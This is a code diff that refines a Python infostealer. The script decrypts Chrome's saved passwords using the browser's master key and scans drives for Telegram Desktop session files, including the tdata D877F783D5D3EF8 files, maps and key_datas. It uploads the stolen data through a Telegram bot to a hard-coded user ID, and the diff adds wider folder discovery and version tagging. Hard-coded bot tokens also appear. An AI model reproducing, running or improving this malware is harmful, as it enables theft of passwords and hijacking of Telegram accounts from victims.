@@ -7,6 +7,7 @@ try:
     from Crypto.Cipher import AES
     import os
     import sqlite3
+    import win32api
 except Exception as e:
     print("ERROR importing: " + repr(e))
     pass
@@ -16,19 +17,19 @@ log_out = 0  # 1 - is on, 0 - is off
 
 
 user_id = 441449437
-token = '651660605:AAHJCsxWiMXEtchhll534q8TMcaHYLyL7SY'
+token = '1384970894:AAFwU-7r8wwDR_Pg6thRoEaEddeQPUSK6fk'
 name_ur_txt = 'pass.txt'
 
 
 bot = TeleBot(token)
 pathusr = os.path.expanduser('~')
-paths = ['C:/', 'D:/', 'E:/', 'F:/', 'G:/', 'H:/', 'I:/', 'J:/']
+paths = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\']
 path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')
 
 
 def getmasterkey():
     try:
-        with open(path) as f:
+        with open(path, encoding="utf-8") as f:
             load = json.load(f)["os_crypt"]["encrypted_key"]
             master_key = b64decode(load)
             master_key = master_key[5:]
@@ -40,12 +41,15 @@ def getmasterkey():
 
 
 def decryption(buff, key):
-    payload = buff[15:]
-    iv = buff[3:15]
-    cipher = AES.new(key, AES.MODE_GCM, iv)
-    decrypted_pass = cipher.decrypt(payload)
-    decrypted_pass = decrypted_pass[:-16].decode()
-    return decrypted_pass
+    try:
+        payload = buff[15:]
+        iv = buff[3:15]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        decrypted_pass = cipher.decrypt(payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+    except Exception as e:
+        print("ERROR in decryption: " + repr(e))
 
 
 def Chrome():
@@ -53,7 +57,7 @@ def Chrome():
     try:
         if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
             shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
-                         os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
+                            os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
             conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
             cursor = conn.cursor()
             cursor.execute('SELECT action_url, username_value, password_value FROM logins')
@@ -80,25 +84,50 @@ def finddir(path):
                     print("***OK Telegram Desktop has been found")
                     return found
                 else:
-                    print("ERROR: is not an actual TG folder")
+                    print("ERROR: ^ this is not an actual TG folder. Continuing...")
+                    pass
 
+def getFileProperties(fname):
+    props = {'FileVersion': None}
+    try:
+        # backslash as parm returns dictionary of numeric info corresponding to VS_FIXEDFILEINFO struc
+        fixedInfo = win32api.GetFileVersionInfo(fname, '\\')
+        props['FileVersion'] = "%d.%d.%d.%d" % (fixedInfo['FileVersionMS'] / 65536,
+                fixedInfo['FileVersionMS'] % 65536, fixedInfo['FileVersionLS'] / 65536,
+                fixedInfo['FileVersionLS'] % 65536)
+    except Exception as e:
+        print(repr(e))
+        pass
+    return props
 
+tddir = []
+# tdata_path = []
 if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
-    tddir = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
-    tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
-    user = pathusr + " " + tddir
-else:
-    for i in paths:
-        tddir = finddir(i)
-        if tddir is not None:
-            user = pathusr + " " + tddir
-            tdata_path = tddir + '\\tdata\\'
-            break
-        else:
-            user = pathusr + " (TG not found)"
-            print("ERROR: Couldn't find 'Telegram Desktop' folder in " + i)
-            pass
+    # tg = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
+    tddir.append(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\')# = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\'
+    # tdata_path.append(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\')# = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
+    # version = "Version: " + str(getFileProperties(os.path.join(tg, "Telegram.exe"))["FileVersion"])
+    #user = pathusr + "\n" + tddir + "\nVersion: " + str(getFileProperties(os.path.join(tddir, "Telegram.exe"))["FileVersion"])
+    print("***OK Default TG folder has been found")
 
+for i in paths:
+    found = finddir(i)
+    if found != None and found != (pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
+        tddir.append(found)# = finddir(i)
+    # if tddir[1] is not None:
+    # print(getFileProperties("Telegram.exe"))
+    # version = "Version: " + str(getFileProperties(os.path.join(tddir[1], "Telegram.exe"))["FileVersion"])
+    # tdata_path.append(tddir[1] + '\\tdata\\')# = tddir[1] + '\\tdata\\'
+    # break
+   # else:
+   #      user = pathusr + "\n(TG not found)"
+   #      print("ERROR: Couldn't find 'Telegram Desktop' folder in " + i)
+   #      pass
+tdata_path =[]
+for i in tddir:
+    #print("test", i)
+    tdata_path.append(os.path.join(i, "tdata"))
+    #print(tdata_path)
 def logout_windows(bool):
     if bool:
         try:
@@ -124,25 +153,32 @@ def send_txt():
 
 
 def send_session_files():
-    for root, dirs, files in os.walk(tdata_path):
-        for dir in dirs:
-            if dir[0:15] == "D877F783D5D3EF8":
-                mapsdir = os.path.join(tdata_path, dir)
-        for file in files:
-            if file[0:15] == "D877F783D5D3EF8":
-                print("***OK Matched D877F783D5D3EF8")
-                global pathd877
-                pathd877 = os.path.join(tdata_path, file)
-                bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'))
-            elif file == "maps":
-                print("***OK Matched maps")
-                bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'))
+    for i in tdata_path:
+        user = getFileProperties(os.path.join(i[:-5],"Telegram.exe"))["FileVersion"]
+        #print(user)
+        for root, dirs, files in os.walk(i):
+            for dir in dirs:
+                if dir[0:15] == "D877F783D5D3EF8":
+                    mapsdir = os.path.join(i, dir)
+            for file in files:
+                if file[0:15] == "D877F783D5D3EF8":
+                    print("***OK Matched D877F783D5D3EF8 in " + i)
+                    pathd877 = os.path.join(i, file)
+                    bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=i + "\nVersion: " + user)
+                elif file == "maps":
+                    print("***OK Matched maps in " + i)
+                    bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'), caption=i + "\nVersion: " + user)
+                elif file == "key_datas":
+                    print("***OK Matched key_datas in " + i)
+                    pathd877 = os.path.join(i, file)
+                    bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=i + "\nVersion: " + user)
+
 
 
 def main():
     try:
         Chrome()
-        bot.send_message(user_id, user)
+        bot.send_message(user_id, pathusr)
         send_txt()
         send_session_files()
         logout_windows(log_out)
